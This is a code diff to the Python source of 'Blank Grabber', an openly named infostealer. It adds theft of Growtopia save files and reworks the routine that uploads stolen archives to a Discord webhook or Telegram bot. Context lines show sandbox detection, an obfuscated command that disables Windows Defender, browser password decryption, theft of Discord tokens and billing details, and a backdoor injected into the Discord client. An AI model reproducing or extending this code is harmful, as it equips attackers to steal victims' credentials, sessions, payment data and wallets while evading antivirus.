@@ -97,7 +97,7 @@ class VmProtect:
         Logger.info("Checking if system is hosted online")
         http = PoolManager(cert_reqs="CERT_NONE")
         try:
-            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
+            return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode(errors= "ignore").strip() == 'true'
         except Exception:
             Logger.info("Unable to check if system is hosted online")
             return False
@@ -118,7 +118,7 @@ class VmProtect:
         Logger.info("Checking registry")
         r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
         r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
-        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode().splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
+        gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= "ignore").splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
         dircheck = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
         return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
 
@@ -261,7 +261,7 @@ class Utility:
 
     @staticmethod
     def DisableDefender() -> None: # Tries to disable the defender
-        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode() # Encoded because it triggers antivirus and it can delete the file
+        command = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode(errors= "ignore") # Encoded because it triggers antivirus and it can delete the file
         subprocess.Popen(command, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
     @staticmethod
@@ -478,7 +478,7 @@ class Browsers:
                 iv = buffer[3:15]
                 cipherText = buffer[15:]
 
-                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode()
+                return pyaes.AESModeOfOperationGCM(key, iv).decrypt(cipherText)[:-16].decode(errors= "ignore")
             else:
                 return str(Syscalls.CryptUnprotectData(buffer))
         
@@ -689,7 +689,7 @@ class Discord:
         for token in tokens:
             r: HTTPResponse = Discord.httpClient.request("GET", "https://discord.com/api/v9/users/@me", headers= Discord.GetHeaders(token.strip()))
             if r.status == 200:
-                r = r.data.decode()
+                r = r.data.decode(errors= "ignore")
                 r = json.loads(r)
                 user = r['username'] + '#' + str(r['discriminator'])
                 id = r['id']
@@ -707,7 +707,7 @@ class Discord:
 
                 nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
 
-                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode())
+                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors= "ignore"))
                 if len(billing) == 0:
                     billing = '(No Payment Method)'
                 else:
@@ -728,7 +728,7 @@ class Discord:
                             methods['Paypal'] += 1
                     billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                 gifts = list()
-                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers= Discord.GetHeaders(token)).data.decode()
+                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers= Discord.GetHeaders(token)).data.decode(errors= "ignore")
                 if 'code' in r:
                     r = json.loads(r)
                     for i in r:
@@ -857,7 +857,7 @@ class Discord:
     def InjectJs() -> str | None: # Injects javascript into the Discord client's file
         check = False
         try:
-            code = base64.b64decode(b"%injectionbase64encoded%").decode().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode()))
+            code = base64.b64decode(b"%injectionbase64encoded%").decode(errors= "ignore").replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors= "ignore")))
         except Exception:
             return None
         
@@ -899,6 +899,7 @@ class BlankGrabber:
     SteamStolen: bool = False # Indicates whether Steam account was stolen or not
     EpicStolen: bool = False # Indicates whether Epic Games account was stolen or not
     UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
+    GrowtopiaStolen: bool = False # Indicates whether Growtopia account was stolen or not
 
     def __init__(self) -> None: # Constructor to call all the functions
         self.Separator = "\n\n" + "Blank Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
@@ -922,6 +923,7 @@ class BlankGrabber:
             (self.StealWallets, False),
             (self.StealMinecraft, False),
             (self.StealEpic, False),
+            (self.StealGrowtopia, False),
             (self.StealSteam, False),
             (self.StealUplay, False),
             (self.GetAntivirus, False),
@@ -944,7 +946,6 @@ class BlankGrabber:
         if Errors.errors: # If there were any errors during the process, then save the error messages into a file
             with open(os.path.join(self.TempFolder, "Errors.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write("# This file contains the errors handled successfully during the functioning of the stealer." + "\n\n" + "=" * 50 + "\n\n" + ("\n\n" + "=" * 50 + "\n\n").join(Errors.errors))
-        self.GenerateTree() # Generate a tree of all the collected files in the temporary folder
         self.SendData() # Send all the data to the webhook
         try:
             Logger.info("Removing archive")
@@ -1011,6 +1012,20 @@ class BlankGrabber:
                         self.MinecraftSessions += 1
                     except Exception:
                         continue
+    
+    @Errors.Catch
+    def StealGrowtopia(self) -> None: # Steals Growtopia session files
+        if Settings.CaptureGames:
+            Logger.info("Stealing Growtopia session")
+            targetFilePath = os.path.join(os.getenv("localappdata"), "Growtopia", "save.dat")
+            saveToPath = os.path.join(self.TempFolder, "Games", "Growtopia")
+            if os.path.isfile(targetFilePath):
+                try:
+                    os.makedirs(saveToPath, exist_ok= True)
+                    shutil.copy(targetFilePath, os.path.join(saveToPath, "save.dat"))
+                    self.GrowtopiaStolen = True
+                except Exception:
+                    pass
                     
     @Errors.Catch
     def StealEpic(self) -> None: #Steals Epic accounts
@@ -1085,6 +1100,7 @@ class BlankGrabber:
             if os.path.isdir(uplayPath):
                 for item in os.listdir(uplayPath):
                     if os.path.isfile(os.path.join(uplayPath, item)):
+                        os.makedirs(saveToPath, exist_ok= True)
                         shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                         self.UplayStolen = True
     
@@ -1197,8 +1213,8 @@ class BlankGrabber:
             saveToDir = os.path.join(self.TempFolder, "System")
 
             process = subprocess.run("systeminfo", capture_output= True, shell= True)
-            if process.returncode == 0:
-                output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+            if output:
                 os.makedirs(saveToDir, exist_ok= True)
                 with open(os.path.join(saveToDir, "System Info.txt"), "w") as file:
                     file.write(output)
@@ -1273,8 +1289,8 @@ class BlankGrabber:
             saveToDir = os.path.join(self.TempFolder, "System")
 
             process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
-            if process.returncode == 0:
-                output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
+            if output:
                 os.makedirs(saveToDir, exist_ok= True)
                 with open(os.path.join(saveToDir, "Task List.txt"), "w", errors= "ignore") as tasklist:
                     tasklist.write(output)
@@ -1412,7 +1428,7 @@ class BlankGrabber:
                 for path in paths:
                     process = subprocess.run('reg query "{}" /v DisplayIcon'.format(path), shell= True, capture_output= True)
                     if process.returncode == 0:
-                        path = process.stdout.strip().decode().split(" " * 4)[-1].split(",")[0]
+                        path = process.stdout.strip().decode(errors= "ignore").split(" " * 4)[-1].split(",")[0]
                         if "telegram" in path.lower():
                             telegramPaths.append(os.path.dirname(path))
             
@@ -1476,42 +1492,31 @@ class BlankGrabber:
                 Logger.info("Injecting backdoor into discord")
                 for dir in paths:
                     appname = os.path.basename(dir)
-                    killTask = Utility.TaskKill(appname)
-                    if killTask.returncode == 0:
-                        for root, _, files in os.walk(dir):
-                            for file in files:
-                                if file.lower() == appname.lower() + '.exe':
-                                    time.sleep(3)
-                                    filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
-                                    UpdateEXE = os.path.join(dir, 'Update.exe')
-                                    DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
-                                    subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+                    Utility.TaskKill(appname)
+                    for root, _, files in os.walk(dir):
+                        for file in files:
+                            if file.lower() == appname.lower() + '.exe':
+                                time.sleep(3)
+                                filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
+                                UpdateEXE = os.path.join(dir, 'Update.exe')
+                                DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
+                                subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
-    def CreateArchive(self) -> tuple[str, str | None]: # Create archive of the data collected
+    def CreateArchive(self) -> tuple[str, str]: # Create archive of the data collected
         Logger.info("Creating archive")
         rarPath = os.path.join(sys._MEIPASS, "rar.exe")
         if Utility.GetSelf()[1] or os.path.isfile(rarPath):
             rarPath = os.path.join(sys._MEIPASS, "rar.exe")
             if os.path.isfile(rarPath):
                 password = Settings.ArchivePassword or "blank"
-                process = subprocess.run('{} a -r -hp{} "{}" *'.format(rarPath, password, self.ArchivePath), capture_output= True, shell= True, cwd= self.TempFolder)
+                process = subprocess.run('{} a -r -hp"{}" "{}" *'.format(rarPath, password, self.ArchivePath), capture_output= True, shell= True, cwd= self.TempFolder)
                 if process.returncode == 0:
                     return "rar"
         
         shutil.make_archive(self.ArchivePath.rsplit(".", 1)[0], "zip", self.TempFolder) # Creates simple unprotected zip file if the above process fails
         return "zip"
-
-    def GenerateTree(self) -> None: # Generates tree of the collected data
-        if os.path.isdir(self.TempFolder):
-            Logger.info("Generating tree")
-            try:
-                contents = "\n".join(Utility.Tree((self.TempFolder, "Stolen Data")))
-                with open(os.path.join(self.TempFolder, "Tree.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
-                    file.write(contents)
-            except Exception:
-                Logger.info("Failed to generate tree")
     
-    def UploadToExternalService(self, path, filename= None) -> str | None: # Uploads a file to gofile.io
+    def UploadToExternalService(self, path, filename= None) -> str | None: # Uploads a file to external service
         if os.path.isfile(path):
             Logger.info("Uploading %s to gofile" % (filename or "file"))
             with open(path, "rb") as file:
@@ -1523,102 +1528,109 @@ class BlankGrabber:
 
             try:
                 1/0
-                server = json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode())["data"]["server"]
+                server = json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode(errors= "ignore"))["data"]["server"]
                 if server:
-                    url = json.loads(http.request("POST", "https://{}.gofile.io/uploadFile".format(server), fields= {"file" : (filename, fileBytes)}).data.decode())["data"]["downloadPage"]
+                    url = json.loads(http.request("POST", "https://{}.gofile.io/uploadFile".format(server), fields= {"file" : (filename, fileBytes)}).data.decode(errors= "ignore"))["data"]["downloadPage"]
                     if url:
                         return url
             except Exception:
                 try:
                     Logger.error("Failed to upload to gofile, trying to upload to anonfiles")
-                    url = json.loads(http.request("POST", "https://api.anonfiles.com/upload", fields= {"file" : (filename, fileBytes)}).data.decode())["data"]["file"]["url"]["short"]
+                    url = json.loads(http.request("POST", "https://api.anonfiles.com/upload", fields= {"file" : (filename, fileBytes)}).data.decode(errors= "ignore"))["data"]["file"]["url"]["short"]
                     return url
                 except Exception:
                      Logger.error("Failed to upload to anonfiles")
                      return None
-
+    
     def SendData(self) -> None: # Sends data to the webhook
+        Logger.info("Sending data to C2")
         extention = self.CreateArchive()
+        if not os.path.isfile(self.ArchivePath):
+            raise FileNotFoundError("Failed to create archive")
+        
+        filename = "Blank-%s.%s" % (os.getlogin(), extention)
 
-        if os.path.isfile(self.ArchivePath):
-            Logger.info("Sending data to C2")
-            computerName = os.getenv("computername")
-            computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
-            totalMemory = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000)) + " GB"
-            uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
-            cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
-            gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
-            productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
-
-            http = PoolManager(cert_reqs="CERT_NONE")
-
-            try:
-                r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
-                if r.get("status") != "success":
-                    raise Exception("Failed")
-                data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
-                if len(r["reverse"]) != 0:
-                    data += f"\nReverse DNS: {r['reverse']}"
-            except Exception:
-                ipinfo = "(Unable to get IP info)"
-            else:
-                ipinfo = data
-
-            system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}"
-
-            collection = {
-                            "Discord Accounts" : self.DiscordTokensCount,
-                            "Passwords" : self.PasswordsCount,
-                            "Cookies" : len(self.Cookies),
-                            "History" : self.HistoryCount,
-                            "Roblox Cookies" : self.RobloxCookiesCount,
-                            "Telegram Sessions" : self.TelegramSessionsCount,
-                            "Common Files" : self.CommonFilesCount,
-                            "Wallets" : self.WalletsCount,
-                            "Wifi Passwords" : self.WifiPasswordsCount,
-                            "Webcam" : self.WebcamPicturesCount,
-                            "Minecraft Sessions" : self.MinecraftSessions,
-                            "Epic Session" : "Yes" if self.EpicStolen else "No",
-                            "Steam Session" : "Yes" if self.SteamStolen else "No",
-                            "Uplay Session" : "Yes" if self.UplayStolen else "No",
-                            "Screenshot" : "Yes" if self.Screenshot else "No",
-                            "System Info" : "Yes" if self.SystemInfo else "No",
-            }
+        computerName = os.getenv("computername") or "Unable to get computer name"
             
-            grabbedInfo = "\n".join([key.ljust(20) + " : " + str(value) for key, value in collection.items()])
+        computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()
+        computerOS = computerOS[2].strip() if len(computerOS) >= 2 else "Unable to detect OS"
 
+        totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
+        totalMemory = (str(int(int(totalMemory[1])/1000000000)) + " GB") if len(totalMemory) >= 1 else "Unable to detect total memory"
+
+        uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
+        uuid = uuid[1].strip() if len(uuid) >= 1 else "Unable to detect UUID"
+
+        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to detect CPU"
+
+        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()
+        gpu = gpu[2].strip() if len(gpu) >= 2 else "Unable to detect GPU"
+
+        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to get product key"
+
+        http = PoolManager(cert_reqs="CERT_NONE")
+
+        try:
+            r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode(errors= "ignore"))
+            if r.get("status") != "success":
+                raise Exception("Failed")
+            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
+            if len(r["reverse"]) != 0:
+                data += f"\nReverse DNS: {r['reverse']}"
+        except Exception:
+            ipinfo = "(Unable to get IP info)"
+        else:
+            ipinfo = data
+
+        system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}"
+
+        collection = {
+            "Discord Accounts" : self.DiscordTokensCount,
+            "Passwords" : self.PasswordsCount,
+            "Cookies" : len(self.Cookies),
+            "History" : self.HistoryCount,
+            "Roblox Cookies" : self.RobloxCookiesCount,
+            "Telegram Sessions" : self.TelegramSessionsCount,
+            "Common Files" : self.CommonFilesCount,
+            "Wallets" : self.WalletsCount,
+            "Wifi Passwords" : self.WifiPasswordsCount,
+            "Webcam" : self.WebcamPicturesCount,
+            "Minecraft Sessions" : self.MinecraftSessions,
+            "Epic Session" : "Yes" if self.EpicStolen else "No",
+            "Steam Session" : "Yes" if self.SteamStolen else "No",
+            "Uplay Session" : "Yes" if self.UplayStolen else "No",
+            "Growtopia Session" : "Yes" if self.GrowtopiaStolen else "No",
+            "Screenshot" : "Yes" if self.Screenshot else "No",
+            "System Info" : "Yes" if self.SystemInfo else "No"
+        }
+        
+        grabbedInfo = "\n".join([key + " : " + str(value) for key, value in collection.items()])
+
+        if Settings.C2[0] == 0: # Discord Webhook
             image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
 
-            payload_discord = {
-  "content": "||@everyone||" if Settings.PingMe else "",
-  "embeds": [
-    {
-      "title": "Blank Grabber",
-      "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
-      "url": "https://github.com/Blank-c/Blank-Grabber",
-      "color": 34303,
-      "footer": {
-        "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
-      },
-      "thumbnail": {
-        "url": image_url
-      }
-    }
-  ],
-  "username" : "Blank Grabber",
-  "avatar_url" : image_url
-}
-
-            payload_telegram = {
-                'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
-                'parse_mode': 'HTML'
+            payload = {
+                "content": "||@everyone||" if Settings.PingMe else "",
+                "embeds": [
+                    {
+                        "title": "Blank Grabber",
+                        "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
+                        "url": "https://github.com/Blank-c/Blank-Grabber",
+                        "color": 34303,
+                        "footer": {
+                            "text": "Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber"
+                        },
+                        "thumbnail": {
+                            "url": image_url
+                        }
+                    }
+                ],
+                "username" : "Blank Grabber",
+                "avatar_url" : image_url
             }
 
-            filename = "Blank-{}.{}".format(os.getlogin(), extention)
-
-            if (Settings.C2[0] == 0 and os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20) \
-                or (Settings.C2[0] == 1 and os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40): # Max upload size for Discord is 25 MB and for Telegram is 50 MB
-                url = self.UploadToExternalService(self.ArchivePath, filename)                       # But just to make sure we set the limit to 20 MB for Discord and 40 MB for Telegram
+            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20: # 20 MB
+                url = self.UploadToExternalService(self.ArchivePath, filename)
                 if url is None:
                     raise Exception("Failed to upload to external service")
             else:
@@ -1626,30 +1638,39 @@ class BlankGrabber:
             
             fields = dict()
 
-            if not url:
-                with open(self.ArchivePath, 'rb') as file:
-                    fileBytes = file.read()
-                if Settings.C2[0] == 0:
-                    fields['file'] = (filename, fileBytes)
-                elif Settings.C2[0] == 1:
-                    fields['document'] = (filename, fileBytes)
+            if url:
+                payload["content"] += " | Archive : %s" % url
             else:
-                if Settings.C2[0] == 0:
-                    payload_discord['content'] += ' | Archive : {}'.format(url)
-                elif Settings.C2[0] == 1:
-                    payload_telegram['caption'] += '\n\nArchive : {}'.format(url)
+                fields["file"] = (filename, open(self.ArchivePath, "rb").read())
+            
+            fields["payload_json"] = json.dumps(payload).encode()
 
+            http.request("POST", Settings.C2[1], fields=fields)
         
-            if Settings.C2[0] == 0:
-                fields['payload_json'] = json.dumps(payload_discord).encode()
-                http.request('POST', Settings.C2[1], fields=fields)
-            elif Settings.C2[0] == 1:
-                token, chat_id = Settings.C2[1].split('$')
-                fields.update(payload_telegram)
-                fields.update({'chat_id': chat_id})
-                http.request('POST', 'https://api.telegram.org/bot%s/sendDocument' % token, fields=fields)
-        else:
-            raise FileNotFoundError("Archive not found")
+        elif Settings.C2[0] == 1: # Telegram Bot
+            payload = {
+                'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
+                'parse_mode': 'HTML'
+            }
+
+            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40: # 40 MB
+                url = self.UploadToExternalService(self.ArchivePath, filename)
+                if url is None:
+                    raise Exception("Failed to upload to external service")
+            else:
+                url = None
+            
+            fields = dict()
+
+            if url:
+                payload["caption"] += "\n\nArchive : %s" % url
+            else:
+                fields["document"] = (filename, open(self.ArchivePath, "rb").read())
+            
+            token, chat_id = Settings.C2[1].split('$')
+            fields.update(payload)
+            fields.update({'chat_id': chat_id})
+            http.request('POST', 'https://api.telegram.org/bot%s/sendDocument' % token, fields=fields)
 
 if __name__ == "__main__" and os.name == "nt":
     Logger.info("Process started")
